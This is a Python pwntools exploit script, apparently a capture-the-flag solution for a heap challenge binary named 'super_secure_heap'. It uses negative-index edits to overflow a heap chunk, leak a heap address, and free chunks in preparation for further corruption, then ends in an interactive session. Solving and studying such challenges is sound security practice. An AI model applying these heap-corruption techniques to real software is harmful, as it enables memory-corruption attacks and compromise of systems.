from pwn import *

exe = ELF("./super_secure_heap")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe

p = process("./super_secure_heap")
gdb.attach(p)

# p = remote("pwn.csaw.io", 9998)

p.recvuntil(b">") # first content chunk of size 100
p.sendline(b"2")
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b"item:")
p.sendline(b"16")

p.recvuntil(b">") # second content chunk of size 16
p.sendline(b"2")
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b"item:")
p.sendline(b"16")

for _ in range(7): # 7 key chunks of size 200 - we need all of these to edit content chunk with negative indices
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b"item:")
    p.sendline(b"200")

p.recvuntil(b">") # third content chunk of size 100 - to be overflowed
p.sendline(b"2")
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b"item:")
p.sendline(b"100")

p.recvuntil(b">") # eight key chunk of size 200 - to be freed
p.sendline(b"1")
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b"item:")
p.sendline(b"200")

p.recvuntil(b">") # free last key chunk
p.sendline(b"1")
p.recvuntil(b">") 
p.sendline(b"2")
p.recvuntil(b"remove:")
p.sendline(b"7")

p.recvuntil(b">") # edit third content chunk through key function to reach freed key chunk
p.sendline(b"1")
p.recvuntil(b">")
p.sendline(b"3")
p.recvuntil(b"modify:")
p.sendline(b"-14")
p.recvuntil(b"size of the content:")
p.sendline(b"200")
p.recvuntil(b"Enter the content:")
p.sendline(b"A"*0x78)

log.success("good heap address")

p.recvuntil(b">") # read leak
p.sendline(b"2")
p.recvuntil(b">") 
p.sendline(b"4")
p.recvuntil(b"want to show:")
p.sendline(b"2")
p.recvuntil(b"A"*0x78)
leak = p.recvuntil(b"keys or content?")
heap_leak = u64(leak[:6].ljust(8, b"\x00")) + 0x286

"""
heap layout here:
content chunk - 0x20
content chunk - 0x20
key chunk - 0xd1
key chunk - 0xd1
key chunk - 0xd1
key chunk - 0xd1
key chunk - 0xd1
key chunk - 0xd1
key chunk - 0xd1
content chunk - 0x64 - overflowed into next
key chunk - 0x4141414141414141
"""

p.recvuntil(b">") # fill second content chunk with something
p.sendline(b"1")
p.recvuntil(b">")
p.sendline(b"3")
p.recvuntil(b"modify:")
p.sendline(b"-15")
p.recvuntil(b"size of the content:")
p.sendline(b"200")
p.recvuntil(b"Enter the content:")
p.sendline(b"ABCDEFGHIJKLMNOP")

p.recvuntil(b">") # free first content chunk
p.sendline(b"2")
p.recvuntil(b">") 
p.sendline(b"2")
p.recvuntil(b"remove:")
p.sendline(b"0")

p.recvuntil(b">") # free second content chunk
p.sendline(b"2")
p.recvuntil(b">") 
p.sendline(b"2")
p.recvuntil(b"remove:")
p.sendline(b"1")

log.success(f"{hex(heap_leak)=}")

p.interactive()